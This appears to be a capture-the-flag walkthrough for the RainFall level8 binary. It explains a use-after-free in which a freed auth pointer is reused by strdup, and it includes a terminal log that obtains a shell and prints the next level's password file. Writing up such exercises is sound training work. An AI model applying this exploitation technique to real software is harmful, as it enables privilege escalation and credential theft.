# Walkthrough

## Disassembling the executable

see source.c

## Exploit

After the disasembly we see that auth isn't set to NULL when we used 'reset' option. So auth still point to the same space of memory as before. Then we allocate more space with a longer string using strdup on service so service and auth point on the same location. Then we call login and here we are '/bin/sh'.

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, (nil) 
reset  
0x804a008, (nil) 
serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
